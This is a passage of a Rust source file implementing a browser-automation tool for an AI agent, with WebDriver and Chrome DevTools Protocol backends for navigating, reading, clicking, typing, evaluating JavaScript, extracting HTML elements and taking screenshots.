use super::{
    AsyncTool, ToolContext,
    utils::http::{SsrfPolicy, validate_public_url},
};
use anyhow::{Context, Result, bail};
use async_trait::async_trait;
use futures_util::{SinkExt, StreamExt};
use reqwest::Url;
use schemars::JsonSchema;
use scraper::{ElementRef, Html, Selector};
use serde::Deserialize;
use std::sync::atomic::{AtomicU64, Ordering};
use std::{
    net::TcpListener,
    path::PathBuf,
    process::Stdio,
    sync::{Arc, OnceLock},
    time::Duration,
};
use thirtyfour::{
    By, ChromiumLikeCapabilities, DesiredCapabilities, WebDriver, prelude::ElementQueryable,
};
use tokio::{
    process::{Child, Command},
    sync::Mutex,
    time::{Instant, sleep},
};
use tokio_tungstenite::{connect_async, tungstenite::Message};
use tracing::{debug, info, warn};

#[cfg(unix)]
use crate::core::processes::kill_process_group;

const DEFAULT_WAIT_SECS: u64 = 10;
const DRIVER_START_TIMEOUT_SECS: u64 = 5;
const MAX_EXTRACT_ELEMENTS: usize = 200;

pub struct Tool;

#[derive(Deserialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum BrowserAction {
    /// Navigate to a URL (optionally waiting for a CSS selector to appear).
    Goto,
    /// Extract visible text from the page or a specific CSS selector.
    Read,
    /// Click an element matching a CSS selector.
    Click,
    /// Type text into an input/textarea matching a CSS selector.
    Type,
    /// Execute JavaScript in the page context and return its JSON result.
    Eval,
    /// Extract structured data (text, attributes, href) from elements matching a CSS selector, parsed server-side with the `scraper` crate.
    Extract,
    /// Capture a PNG screenshot of the current viewport (or element) to a file.
    Screenshot,
    /// Show current URL, title, and session status.
    Status,
    /// Close the active browser session and free resources.
    Close,
}

#[derive(Deserialize, JsonSchema)]
pub struct BrowserArgs {
    /// Action to perform.
    pub action: BrowserAction,
    /// Target URL (required for `goto`).
    #[serde(default)]
    pub url: Option<String>,
    /// CSS selector to target (used by `read`, `click`, `type`, `extract`, `screenshot`, or as wait condition in `goto`).
    #[serde(default)]
    pub selector: Option<String>,
    /// Text to type (required for `type`).
    #[serde(default)]
    pub text: Option<String>,
    /// Clear existing input before typing (default: true).
    #[serde(default = "default_true")]
    pub clear: bool,
    /// JavaScript snippet to execute (required for `eval`).
    #[serde(default)]
    pub script: Option<String>,
    /// Relative workspace path to save screenshot PNG (optional for `screenshot`; defaults to a temp file).
    #[serde(default)]
    pub path: Option<String>,
    /// Max seconds to wait for `selector` to appear (default: 10).
    #[serde(default)]
    pub wait_secs: Option<u64>,
    /// Whether to run the browser in headless mode (no visible window).
    /// Set to `true` for headless, or `false` for a visible window you can
    /// observe and interact with.
    ///
    /// This is a *sticky* session setting: once a mode is established it persists
    /// across subsequent calls, so only provide it when you want to (re)start the
    /// session in a specific mode. When omitted, the current session's mode is
    /// kept; if no session exists yet, the default comes from `browser.headless`
    /// in config.toml (default: `false`, i.e. a visible window).
    ///
    /// Ignored when `browser.backend` is set to `"cdp"` in config.toml (attaching to an existing browser).
    #[serde(default)]
    pub headless: Option<bool>,
}

fn default_true() -> bool {
    true
}

/// Backend trait for browser automation.
///
/// Implementations can target different protocols (WebDriver, CDP) while
/// sharing the same action surface exposed to the LLM.
#[async_trait]
pub trait BrowserBackend: Send + Sync {
    /// Human-readable label for status display (e.g. `"managed chromedriver"`, `"CDP"`).
    fn label(&self) -> String;

    /// Navigate to a URL.
    async fn goto(&self, url: &str) -> Result<()>;

    /// Wait for a CSS selector to appear in the DOM.
    async fn wait_for_selector(&self, sel: &str, timeout: Duration) -> Result<()>;

    /// Read visible text from the element matching `sel`.
    async fn read_selector_text(&self, sel: &str, timeout: Duration) -> Result<String>;

    /// Read visible text from the page `<body>`.
    async fn read_page_text(&self) -> Result<String>;

    /// Get the full rendered outer HTML of the document.
    async fn get_outer_html(&self) -> Result<String>;

    /// Click the element matching `sel`.
    async fn click(&self, sel: &str, timeout: Duration) -> Result<()>;

    /// Type `text` into the element matching `sel`.
    async fn type_text(&self, sel: &str, text: &str, clear: bool, timeout: Duration) -> Result<()>;

    /// Execute JavaScript in the page context and return the JSON result.
    async fn evaluate(&self, script: &str) -> Result<serde_json::Value>;

    /// Capture a PNG screenshot (viewport, or element if `sel` is `Some`).
    async fn screenshot(&self, sel: Option<&str>, timeout: Duration) -> Result<Vec<u8>>;

    /// Get the current page URL.
    async fn current_url(&self) -> Result<String>;

    /// Get the current page title.
    async fn title(&self) -> Result<String>;

    /// Check whether the browser session is still alive.
    async fn is_alive(&self) -> bool;

    /// Close the browser session and free resources.
    async fn close(&self) -> Result<()>;
}

struct ManagedDriverProcess {
    child: Child,
    #[cfg(unix)]
    pgid: Option<u32>,
}

impl ManagedDriverProcess {
    fn spawn(port: u16) -> Result<Self> {
        let mut cmd = Command::new("chromedriver");
        cmd.arg(format!("--port={port}"))
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .kill_on_drop(true);
        #[cfg(unix)]
        cmd.process_group(0);

        let child = cmd.spawn().context(
            "Failed to spawn `chromedriver`. Ensure it is installed in PATH \
             or set ARCHON_WEBDRIVER_URL to an existing WebDriver endpoint.",
        )?;
        #[cfg(unix)]
        let pgid = child.id();

        Ok(Self {
            child,
            #[cfg(unix)]
            pgid,
        })
    }

    async fn terminate(mut self) {
        #[cfg(unix)]
        if let Some(pgid) = self.pgid.take() {
            kill_process_group(pgid);
        }
        let _ = self.child.start_kill();
        let _ = self.child.wait().await;
    }
}

impl Drop for ManagedDriverProcess {
    fn drop(&mut self) {
        #[cfg(unix)]
        if let Some(pgid) = self.pgid.take() {
            kill_process_group(pgid);
        }
        let _ = self.child.start_kill();
    }
}

struct WebDriverBackend {
    driver: WebDriver,
    /// Present only when Archon spawned `chromedriver` itself.
    driver_proc: Option<ManagedDriverProcess>,
}

#[async_trait]
impl BrowserBackend for WebDriverBackend {
    fn label(&self) -> String {
        if self.driver_proc.is_some() {
            "managed chromedriver".into()
        } else {
            "external WebDriver".into()
        }
    }

    async fn goto(&self, url: &str) -> Result<()> {
        self.driver
            .goto(url)
            .await
            .with_context(|| format!("Failed to navigate to '{url}'"))?;
        Ok(())
    }

    async fn wait_for_selector(&self, sel: &str, timeout: Duration) -> Result<()> {
        find_with_wait(&self.driver, sel, timeout.as_secs()).await?;
        Ok(())
    }

    async fn read_selector_text(&self, sel: &str, timeout: Duration) -> Result<String> {
        let elem = find_with_wait(&self.driver, sel, timeout.as_secs()).await?;
        elem.text().await.context("Failed to read element text")
    }

    async fn read_page_text(&self) -> Result<String> {
        let body = self
            .driver
            .find(By::Tag("body"))
            .await
            .context("Page has no <body>")?;
        body.text().await.context("Failed to read page text")
    }

    async fn get_outer_html(&self) -> Result<String> {
        let ret = self
            .driver
            .execute("return document.documentElement.outerHTML", vec![])
            .await
            .context("Failed to read rendered HTML")?;
        ret.json()
            .as_str()
            .map(str::to_owned)
            .ok_or_else(|| anyhow::anyhow!("rendered HTML source was not a string"))
    }

    async fn click(&self, sel: &str, timeout: Duration) -> Result<()> {
        let elem = find_with_wait(&self.driver, sel, timeout.as_secs()).await?;
        elem.click()
            .await
            .with_context(|| format!("Failed to click '{sel}'"))?;
        Ok(())
    }

    async fn type_text(&self, sel: &str, text: &str, clear: bool, timeout: Duration) -> Result<()> {
        let elem = find_with_wait(&self.driver, sel, timeout.as_secs()).await?;
        if clear {
            let _ = elem.clear().await;
        }
        elem.send_keys(text)
            .await
            .with_context(|| format!("Failed to type into '{sel}'"))?;
        Ok(())
    }

    async fn evaluate(&self, script: &str) -> Result<serde_json::Value> {
        let ret = self
            .driver
            .execute(ensure_return(script), vec![])
            .await
            .context("JavaScript evaluation failed")?;
        Ok(ret.json().clone())
    }

    async fn screenshot(&self, sel: Option<&str>, timeout: Duration) -> Result<Vec<u8>> {
        match sel {
            Some(s) => {
                let elem = find_with_wait(&self.driver, s, timeout.as_secs()).await?;
                Ok(elem
                    .screenshot_as_png()
                    .await
                    .context("Failed to capture element screenshot")?)
            }
            None => Ok(self
                .driver
                .screenshot_as_png()
                .await
                .context("Failed to capture viewport screenshot")?),
        }
    }

    async fn current_url(&self) -> Result<String> {
        Ok(self.driver.current_url().await?.to_string())
    }

    async fn title(&self) -> Result<String> {
        self.driver
            .title()
            .await
            .context("Failed to get page title")
    }

    async fn is_alive(&self) -> bool {
        self.driver.status().await.is_ok()
    }

    async fn close(&self) -> Result<()> {
        let driver = self.driver.clone();
        if let Err(e) = driver.quit().await {
            debug!("WebDriver quit error during close: {e}");
        }
        Ok(())
    }
}

// ─── CDP Backend ───────────────────────────────────────────────────────────────

/// Which browser backend to use.
#[derive(Debug, Clone)]
enum BackendType {
    WebDriver,
    Cdp { port: u16 },
}

impl BackendType {
    /// Resolve the backend from config:
    /// - `browser.backend = "cdp"` enables CDP mode using `browser.cdp_port`
    /// - anything else defaults to WebDriver (chromedriver)
    fn resolve(backend: &str, cdp_port: u16) -> Self {
        match backend {
            "cdp" => Self::Cdp { port: cdp_port },
            _ => Self::WebDriver,
        }
    }
}

/// Resolve the default headless mode used when a tool call does not pass
/// `headless` explicitly and no session exists yet.
///
/// `ARCHON_BROWSER_HEADLESS` (a boolean string) overrides
/// `browser.headless` from config.toml, which defaults to `false` (visible).
fn resolve_headless_default(config_default: bool) -> bool {
    std::env::var("ARCHON_BROWSER_HEADLESS")
        .ok()
        .and_then(|v| v.parse::<bool>().ok())
        .unwrap_or(config_default)
}

/// Attaches to an already-running Chrome via the Chrome DevTools Protocol.
///
/// Chrome must be launched with `--remote-debugging-port=<port>`.
/// This backend does **not** spawn or kill Chrome — it connects to the user's
/// live browser session over WebSocket.
/// Encode a string as a safe JavaScript string literal (double-quoted).
///
/// Uses JSON string escaping, which is a strict subset of valid JS string
/// literal syntax. This prevents injection when interpolating user-supplied
/// CSS selectors into `Runtime.evaluate` expressions.
fn js_str(s: &str) -> String {
    serde_json::to_string(s).expect("&str always serializes to JSON")
}

struct CdpBackend {
    ws: Mutex<
        tokio_tungstenite::WebSocketStream<
            tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>,
        >,
    >,
    next_id: AtomicU64,
}

impl CdpBackend {
    /// Discover a page target on `localhost:{port}` and connect via WebSocket.
    async fn connect(port: u16) -> Result<Self> {
        let targets_url = format!("http://127.0.0.1:{port}/json");
        let targets: Vec<serde_json::Value> = reqwest::get(&targets_url)
            .await
            .with_context(|| {
                format!(
                    "Failed to query CDP targets at {targets_url}. \n\
                     Ensure Chrome is running with --remote-debugging-port={port}"
                )
            })?
            .json()
            .await
            .context("Failed to parse CDP target list")?;

        let target = targets
            .iter()
            .find(|t| t.get("type").and_then(|v| v.as_str()) == Some("page"))
            .context("No 'page' target found in CDP target list. Is a tab open?")?;

        let ws_url = target
            .get("webSocketDebuggerUrl")
            .and_then(|v| v.as_str())
            .context("CDP target has no webSocketDebuggerUrl")?;

        info!("Connecting to CDP WebSocket: {ws_url}");
        let (ws, _response) = connect_async(ws_url.to_string())
            .await
            .with_context(|| format!("WebSocket connection to CDP failed at {ws_url}"))?;

        let backend = Self {
            ws: Mutex::new(ws),
            next_id: AtomicU64::new(1),
        };

        // Enable the CDP domains we need.
        backend
            .send_cmd("Page.enable", serde_json::json!({}))
            .await?;
        backend
            .send_cmd("Runtime.enable", serde_json::json!({}))
            .await?;
        backend
            .send_cmd("DOM.enable", serde_json::json!({}))
            .await?;

        info!("CDP backend connected and domains enabled");
        Ok(backend)
    }

    /// Send a CDP command and wait for the matching response by `id`.
    async fn send_cmd(&self, method: &str, params: serde_json::Value) -> Result<serde_json::Value> {
        let id = self.next_id.fetch_add(1, Ordering::Relaxed);
        let msg = serde_json::json!({
            "id": id,
            "method": method,
            "params": params,
        });

        let mut ws = self.ws.lock().await;
        ws.send(Message::Text(msg.to_string()))
            .await
            .with_context(|| format!("Failed to send CDP command {method}"))?;

        // Read frames until we get the response with our id.
        loop {
            let frame = ws
                .next()
                .await
                .ok_or_else(|| anyhow::anyhow!("WebSocket connection closed"))?
                .with_context(|| format!("WebSocket error during {method}"))?;

            let text = frame
                .to_text()
                .with_context(|| format!("CDP response to {method} was not text"))?;
            let json: serde_json::Value =
                serde_json::from_str(text).context("Failed to parse CDP response")?;

            if json.get("id").and_then(|v| v.as_u64()) == Some(id) {
                if let Some(error) = json.get("error") {
                    bail!("CDP error in {method}: {error}");
                }
                return Ok(json
                    .get("result")
                    .cloned()
                    .unwrap_or(serde_json::Value::Null));
            }
            // Event or unrelated response — skip
        }
    }

    /// Evaluate a JavaScript expression and return the result value.
    async fn evaluate_raw(&self, expression: &str) -> Result<serde_json::Value> {
        let result = self
            .send_cmd(
                "Runtime.evaluate",
                serde_json::json!({
                    "expression": expression,
                    "returnByValue": true,
                }),
            )
            .await?;

        if let Some(exception) = result.get("exceptionDetails") {
            let desc = exception
                .pointer("/exception/description")
                .and_then(|d| d.as_str())
                .unwrap_or("unknown JS error");
            bail!("JS evaluation failed: {desc}");
        }

        Ok(result
            .pointer("/result/value")
            .cloned()
            .unwrap_or(serde_json::Value::Null))
    }
}

#[async_trait]
impl BrowserBackend for CdpBackend {
    fn label(&self) -> String {
        "CDP (attached)".into()
    }

    async fn goto(&self, url: &str) -> Result<()> {
        self.send_cmd("Page.navigate", serde_json::json!({"url": url}))
            .await?;
        // Poll document.readyState until the page is fully loaded.
        let deadline = Instant::now() + Duration::from_secs(30);
        loop {
            let state = self.evaluate_raw("document.readyState").await?;
            if state.as_str() == Some("complete") {
                return Ok(());
            }
            if Instant::now() > deadline {
                bail!("Timed out waiting for page to load: {url}");
            }
            sleep(Duration::from_millis(100)).await;
        }
    }

    async fn wait_for_selector(&self, sel: &str, timeout: Duration) -> Result<()> {
        let escaped = js_str(sel);
        let expr = format!("document.querySelector({escaped}) !== null");
        let deadline = Instant::now() + timeout;
        loop {
            if self.evaluate_raw(&expr).await?.as_bool() == Some(true) {
                return Ok(());
            }
            if Instant::now() > deadline {
                bail!("Element '{sel}' not found within {}s", timeout.as_secs());
            }
            sleep(Duration::from_millis(200)).await;
        }
    }

    async fn read_selector_text(&self, sel: &str, timeout: Duration) -> Result<String> {
        self.wait_for_selector(sel, timeout).await?;
        let escaped = js_str(sel);
        let expr = format!("document.querySelector({escaped})?.textContent ?? ''");
        let val = self.evaluate_raw(&expr).await?;
        Ok(val.as_str().unwrap_or("").to_string())
    }

    async fn read_page_text(&self) -> Result<String> {
        let val = self.evaluate_raw("document.body?.innerText ?? ''").await?;
        Ok(val.as_str().unwrap_or("").to_string())
    }

    async fn get_outer_html(&self) -> Result<String> {
        let val = self
            .evaluate_raw("document.documentElement.outerHTML")
            .await?;
        val.as_str()
            .map(str::to_owned)
            .ok_or_else(|| anyhow::anyhow!("document outerHTML was not a string"))
    }

    async fn click(&self, sel: &str, _timeout: Duration) -> Result<()> {
        let escaped = js_str(sel);
        let expr = format!(
            r#"(() => {{
                const el = document.querySelector({escaped});
                if (!el) return null;
                el.scrollIntoView({{block:'center'}});
                const r = el.getBoundingClientRect();
                return {{x: r.x + r.width/2, y: r.y + r.height/2}};
            }})()"#
        );
        let coords = self.evaluate_raw(&expr).await?;
        let x = coords
            .get("x")
            .and_then(|v| v.as_f64())
            .ok_or_else(|| anyhow::anyhow!("Element '{sel}' not found"))?;
        let y = coords
            .get("y")
            .and_then(|v| v.as_f64())
            .ok_or_else(|| anyhow::anyhow!("Element '{sel}' not found"))?;

        self.send_cmd(
            "Input.dispatchMouseEvent",
            serde_json::json!({
                "type": "mousePressed", "x": x, "y": y,
                "button": "left", "clickCount": 1
            }),
        )
        .await?;
        self.send_cmd(
            "Input.dispatchMouseEvent",
            serde_json::json!({
                "type": "mouseReleased", "x": x, "y": y,
                "button": "left", "clickCount": 1
            }),
        )
        .await?;
        Ok(())
    }

    async fn type_text(&self, sel: &str, text: &str, clear: bool, timeout: Duration) -> Result<()> {
        self.wait_for_selector(sel, timeout).await?;
        let escaped = js_str(sel);

        // Focus the element.
        self.evaluate_raw(&format!("document.querySelector({escaped})?.focus()"))
            .await?;

        // Clear if requested.
        if clear {
            self.evaluate_raw(&format!(
                r#"(() => {{
                    const el = document.querySelector({escaped});
                    if (el) {{ el.value = ''; el.dispatchEvent(new Event('input', {{bubbles:true}})); }}
                }})()"#
            ))
            .await?;
        }

        // Insert text via CDP Input domain.
        self.send_cmd("Input.insertText", serde_json::json!({"text": text}))
            .await?;
        Ok(())
    }

    async fn evaluate(&self, script: &str) -> Result<serde_json::Value> {
        // `Runtime.evaluate` runs in the global scope where `return` is a
        // SyntaxError. If the script uses top-level `return` (the pattern
        // required by WebDriver's `execute`), wrap it in an IIFE.
        let expr = if has_return_statement(script) {
            format!("(() => {{ {script} }})()")
        } else {
            script.to_string()
        };
        self.evaluate_raw(&expr).await
    }

    async fn screenshot(&self, sel: Option<&str>, _timeout: Duration) -> Result<Vec<u8>> {
        let params = if let Some(s) = sel {
            let escaped = js_str(s);
            let box_expr = format!(
                r#"(() => {{
                    const el = document.querySelector({escaped});
                    if (!el) return null;
                    el.scrollIntoView();
                    const r = el.getBoundingClientRect();
                    return {{x:r.x, y:r.y, width:r.width, height:r.height}};
                }})()"#
            );
            let rect = self.evaluate_raw(&box_expr).await?;
            serde_json::json!({
                "format": "png",
                "clip": {
                    "x": rect.get("x").cloned().unwrap_or(serde_json::json!(0)),
                    "y": rect.get("y").cloned().unwrap_or(serde_json::json!(0)),
                    "width": rect.get("width").cloned().unwrap_or(serde_json::json!(1440)),
                    "height": rect.get("height").cloned().unwrap_or(serde_json::json!(900)),
                    "scale": 1
                }
            })
        } else {
            serde_json::json!({"format": "png"})
        };

        let result = self.send_cmd("Page.captureScreenshot", params).await?;
        let b64 = result
            .get("data")
            .and_then(|d| d.as_str())
            .context("CDP screenshot response had no 'data' field")?;
        use base64::Engine;
        base64::engine::general_purpose::STANDARD
            .decode(b64)
            .context("Failed to decode CDP screenshot base64")
    }

    async fn current_url(&self) -> Result<String> {
        let val = self.evaluate_raw("location.href").await?;
        Ok(val.as_str().unwrap_or("").to_string())
    }

    async fn title(&self) -> Result<String> {
        let val = self.evaluate_raw("document.title").await?;
        Ok(val.as_str().unwrap_or("").to_string())
    }

    async fn is_alive(&self) -> bool {
        self.evaluate_raw("'alive'").await.is_ok()
    }

    async fn close(&self) -> Result<()> {
        // Don't kill Chrome — it's the user's daily driver.
        // The WebSocket connection closes when the CdpBackend is dropped.
        debug!("CDP session closed (WebSocket will drop on cleanup)");
        Ok(())
    }
}

pub struct BrowserRegistry {
    session: Mutex<Option<Arc<dyn BrowserBackend>>>,
    headless: Mutex<bool>,
}

impl BrowserRegistry {
    pub fn global() -> Arc<Self> {
        static INSTANCE: OnceLock<Arc<BrowserRegistry>> = OnceLock::new();
        INSTANCE
            .get_or_init(|| {
                Arc::new(Self {
                    session: Mutex::new(None),
                    headless: Mutex::new(false),
                })
            })
            .clone()
    }

    fn external_webdriver_url() -> Option<String> {
        std::env::var("ARCHON_WEBDRIVER_URL")
            .ok()
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
    }

    fn allocate_local_port() -> Result<u16> {
        let listener =
            TcpListener::bind("127.0.0.1:0").context("Failed to bind ephemeral local port")?;
        Ok(listener.local_addr()?.port())
    }

    async fn wait_for_driver_ready(wd_url: &str, proc: &mut ManagedDriverProcess) -> Result<()> {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_millis(500))
            .build()?;
        let status_url = format!("{wd_url}/status");
        let deadline = Instant::now() + Duration::from_secs(DRIVER_START_TIMEOUT_SECS);

        while Instant::now() < deadline {
            if let Some(exit) = proc.child.try_wait()? {
                bail!("`chromedriver` exited prematurely with status {exit}");
            }
            if let Ok(resp) = client.get(&status_url).send().await
                && resp.status().is_success()
            {
                return Ok(());
            }
            sleep(Duration::from_millis(50)).await;
        }

        bail!("Timed out waiting for `chromedriver` to become ready at {wd_url}");
    }

    async fn connect_new(
        headless: bool,
        backend_type: &BackendType,
    ) -> Result<Arc<dyn BrowserBackend>> {
        match backend_type {
            BackendType::Cdp { port } => {
                let backend = CdpBackend::connect(*port).await?;
                Ok(Arc::new(backend))
            }
            BackendType::WebDriver => Self::connect_webdriver(headless).await,
        }
    }

    async fn connect_webdriver(headless: bool) -> Result<Arc<dyn BrowserBackend>> {
        let (wd_url, mut driver_proc) = match Self::external_webdriver_url() {
            Some(url) => (url, None),
            None => {
                let port = Self::allocate_local_port()?;
                let url = format!("http://127.0.0.1:{port}");
                info!("Spawning managed chromedriver on {url}");
                let mut proc = ManagedDriverProcess::spawn(port)?;
                if let Err(e) = Self::wait_for_driver_ready(&url, &mut proc).await {
                    proc.terminate().await;
                    return Err(e);
                }
                (url, Some(proc))
            }
        };

        let mut caps = DesiredCapabilities::chrome();
        if headless {
            caps.add_arg("--headless=new")?;
            caps.add_arg("--disable-gpu")?;
        }
        caps.add_arg("--window-size=1440,900")?;

        let mode = if headless { "headless" } else { "visible" };
        info!("Starting {mode} WebDriver session at {wd_url}");
        match WebDriver::new(&wd_url, caps).await {
            Ok(driver) => Ok(Arc::new(WebDriverBackend {
                driver,
                driver_proc,
            })),
            Err(e) => {
                if let Some(proc) = driver_proc.take() {
                    proc.terminate().await;
                }
                Err(e).with_context(|| format!("Failed to connect to WebDriver at {wd_url}"))
            }
        }
    }

    /// Returns a live WebDriver for the requested mode.
    ///
    /// `headless` is a *sticky* session setting:
    /// - `Some(h)` establishes/overrides the mode, reconnecting only if it differs
    ///   from the current session's mode.
    /// - `None` keeps the current session's mode. When no session exists yet,
    ///   `default_headless` applies — this comes from `browser.headless` in
    ///   config.toml (default: `false`, i.e. a visible browser window).
    ///
    /// This means the mode only has to be specified once; omitting it on later calls
    /// no longer forces a reconnect back to a default.
    async fn get_or_init(
        &self,
        headless: Option<bool>,
        default_headless: bool,
        backend_type: &BackendType,
    ) -> Result<Arc<dyn BrowserBackend>> {
        let stored_headless = *self.headless.lock().await;

        let mut guard = self.session.lock().await;
        let desired = match headless {
            Some(h) => h,
            None if guard.is_some() => stored_headless,
            None => default_headless,
        };
        let mode_changed = desired != stored_headless;

        if let Some(ref existing) = *guard {
            if !mode_changed && existing.is_alive().await {
                return Ok(Arc::clone(existing));
            }
            if mode_changed {
                info!(
                    "Browser mode changed (headless: {stored_headless} -> {desired}); reconnecting..."
                );
            } else {
                warn!("Existing browser session is stale; reconnecting...");
            }
            if let Some(stale) = guard.take() {
                let _ = stale.close().await;
            }
        }

        if mode_changed {
            *self.headless.lock().await = desired;
        }

        let backend = Self::connect_new(desired, backend_type).await?;
        let cloned = Arc::clone(&backend);
        *guard = Some(backend);
        Ok(cloned)
    }

    /// The headless mode of the current (or most recently created) session.
    pub async fn headless_mode(&self) -> bool {
        *self.headless.lock().await
    }

    pub async fn status(&self) -> String {
        let headless = *self.headless.lock().await;
        let guard = self.session.lock().await;
        let Some(ref backend) = *guard else {
            let mode = if headless { "headless" } else { "visible" };
            return format!("Browser status: inactive (no open session, mode: {mode}).");
        };
        let url = backend.current_url().await.unwrap_or_default();
        let title = backend.title().await.unwrap_or_default();
        let label = backend.label();
        let mode = if headless { "headless" } else { "visible" };
        format!("Browser status: active ({mode}, {label})\nURL: {url}\nTitle: {title}")
    }

    pub async fn close(&self) -> Result<String> {
        let existing = self.session.lock().await.take();
        match existing {
            Some(backend) => {
                let _ = backend.close().await;
                Ok("Browser session closed.".into())
            }
            None => Ok("No active browser session.".into()),
        }
    }

    /// Called by `CoreEngine::run` on shutdown.
    pub async fn shutdown(&self) {
        if let Some(backend) = self.session.lock().await.take() {
            info!("Shutting down active browser session...");
            let _ = backend.close().await;
        }
    }
}

/// Ensure the script has an explicit `return` statement.
///
/// Chromedriver ≥ 157 wraps the script in a function body, so bare
/// expressions evaluate to `undefined` (serialised as `null`) unless
/// you use an explicit `return`.  Single-expression scripts get one
/// auto-prepended; multi-statement scripts are passed through unchanged
/// (the user is expected to include their own `return`).
///
/// Detection: only a *top-level* `return` (parenthesis depth 0 and brace
/// depth 0) counts. `return`s nested inside a callback/function body, e.g.
/// `[1,2,3].map(function (x) { return x * 2; })`, are deliberately ignored so
/// that a `return` is still auto-prepended for the outer expression.
/// String literals, template literals, and comments are skipped, so the
/// substring "return" (e.g. in a CSS selector like `.return-btn`) never
/// produces a false positive.
fn ensure_return(script: &str) -> String {
    let trimmed = script.trim();
    if has_return_statement(trimmed) {
        trimmed.to_string()
    } else {
        format!("return {trimmed}")
    }
}

/// Returns `true` if the script contains a *top-level* `return` statement.
///
/// A `return` only counts as top-level when it is **not** nested inside a
/// function body (a `function (...) { ... }`, `function { ... }`, or
/// `=> { ... }` body). This correctly ignores `return`s that belong to an
/// inner callback (for example
/// `[1,2,3].map(function (x) { return x * 2; })`), which would otherwise
/// suppress the required top-level `return` and make the whole expression
/// evaluate to `undefined` (serialised as `null`).
///
/// A `return` inside a *plain* block is still top-level, e.g.
/// `if (x) { return 1; }` or `{ return 'a'; }`.
///
/// String literals, template literals, and line/block comments are skipped,
/// so the substring "return" (e.g. inside a CSS selector such as
/// `.return-btn`) never triggers a false positive.
fn has_return_statement(script: &str) -> bool {
    let chars: Vec<char> = script.chars().collect();
    let n = chars.len();
    let is_ident = |ch: char| ch.is_ascii_alphanumeric() || ch == '_';

    let mut i = 0;
    let mut paren_depth: i32 = 0;
    let mut brace_stack: Vec<bool> = Vec::new(); // true = function body
    let mut fn_awaiting_paren = false; // saw `function`; a param-list `(` may follow
    let mut fn_param_depth: Option<i32> = None; // open depth of a function param list
    let mut next_brace_is_fn = false; // the next `{` opens a function body

    while i < n {
        let c = chars[i];

        // Line comment: skip to the end of the line.
        if c == '/' && i + 1 < n && chars[i + 1] == '/' {
            while i < n && chars[i] != '\n' {
                i += 1;
            }
            continue;
        }
        // Block comment: skip to the closing `*/`.
        if c == '/' && i + 1 < n && chars[i + 1] == '*' {
            i += 2;
            while i + 1 < n && !(chars[i] == '*' && chars[i + 1] == '/') {
                i += 1;
            }
            i += 2; // consume the closing `*/` (or run off the end)
            continue;
        }
        // String / template literal: skip to the matching (unescaped) quote.
        if c == '"' || c == '\'' || c == '`' {
            let quote = c;
            i += 1;
            while i < n && chars[i] != quote {
                if chars[i] == '\\' {
                    i += 1; // skip the escaped character
                }
                i += 1;
            }
            i += 1; // skip the closing quote (or run off the end)
            continue;
        }
        if c.is_whitespace() {
            i += 1;
            continue;
        }

        // `function` keyword (whole word).
        if c == 'f'
            && chars[i..]
                .iter()
                .collect::<String>()
                .starts_with("function")
            && chars.get(i + 8).map(|ch| !is_ident(*ch)).unwrap_or(true)
        {
            fn_awaiting_paren = true;
            next_brace_is_fn = true; // covers a paramless `function { ... }`
            i += 8;
            continue;
        }

        // Arrow `=>` (a `=` immediately followed by `>`).
        if c == '=' && i + 1 < n && chars[i + 1] == '>' {
            next_brace_is_fn = true;
            i += 2;
            continue;
        }

        match c {
            '(' => {
                paren_depth += 1;
                if fn_awaiting_paren {
                    fn_param_depth = Some(paren_depth);
                    fn_awaiting_paren = false;
                }
                i += 1;
            }
            ')' => {
                paren_depth -= 1;
                if matches!(fn_param_depth, Some(d) if paren_depth == d - 1) {
                    next_brace_is_fn = true;
                    fn_param_depth = None;
                }
                i += 1;
            }
            '{' => {
                brace_stack.push(next_brace_is_fn);
                next_brace_is_fn = false;
                fn_awaiting_paren = false;
                i += 1;
            }
            '}' => {
                brace_stack.pop();
                i += 1;
            }
            'r' if paren_depth == 0 => {
                let is_word = chars.get(i + 6).map(|ch| !is_ident(*ch)).unwrap_or(true);
                if chars[i..].iter().collect::<String>().starts_with("return") && is_word {
                    // A top-level `return` unless we are nested inside a
                    // function body (a callback), in which case it is not the
                    // top-level return the driver needs.
                    if !brace_stack.iter().any(|&b| b) {
                        return true;
                    }
                }
                i += 1;
            }
            _ => {
                // Any other token ends a pending `function`/`=>` body.
                fn_awaiting_paren = false;
                next_brace_is_fn = false;
                i += 1;
            }
        }
    }

    false
}

async fn find_with_wait(
    driver: &WebDriver,
    selector: &str,
    wait_secs: u64,
) -> Result<thirtyfour::WebElement> {
    driver
        .query(By::Css(selector))
        .wait(Duration::from_secs(wait_secs), Duration::from_millis(150))
        .first()
        .await
        .with_context(|| format!("Element '{selector}' not found within {wait_secs}s"))
}

/// Extract structured data (inner text, all attributes, and a resolved
/// `href`) from every element matching `selector` in an HTML `source`.
///
/// This is the CSS-selector extraction engine behind the `extract` action.
/// It parses the rendered HTML once with `scraper` and returns a JSON object:
/// `{ selector, count, truncated, items: [{ text, attrs, href }] }`.
fn extract_from_html(source: &str, selector: &str) -> Result<serde_json::Value> {
    let document = Html::parse_document(source);
    let sel = Selector::parse(selector)
        .map_err(|e| anyhow::anyhow!("Invalid CSS selector '{selector}': {e}"))?;
    let anchor_sel = Selector::parse("a[href]").expect("'a[href]' is a valid CSS selector");

    let matches: Vec<ElementRef> = document.select(&sel).collect();
    let truncated = matches.len() > MAX_EXTRACT_ELEMENTS;

    let items: Vec<serde_json::Value> = matches
        .iter()
        .take(MAX_EXTRACT_ELEMENTS)
        .map(|element| {
            let text: String = element.text().collect();
            let attrs: serde_json::Map<String, serde_json::Value> = element
                .value()
                .attrs
                .iter()
                .map(|(name, value)| {
                    (
                        name.local.to_string(),
                        serde_json::Value::String(value.to_string()),
                    )
                })
                .collect();
            let href = element.attr("href").map(str::to_owned).or_else(|| {
                element
                    .select(&anchor_sel)
                    .next()
                    .and_then(|a| a.attr("href").map(str::to_owned))
            });
            serde_json::json!({
                "text": text.trim(),
                "attrs": attrs,
                "href": href,
            })
        })
        .collect();

    Ok(serde_json::json!({
        "selector": selector,
        "count": items.len(),
        "truncated": truncated,
        "items": items,
    }))
}

impl AsyncTool for Tool {
    const NAME: &'static str = "browser";
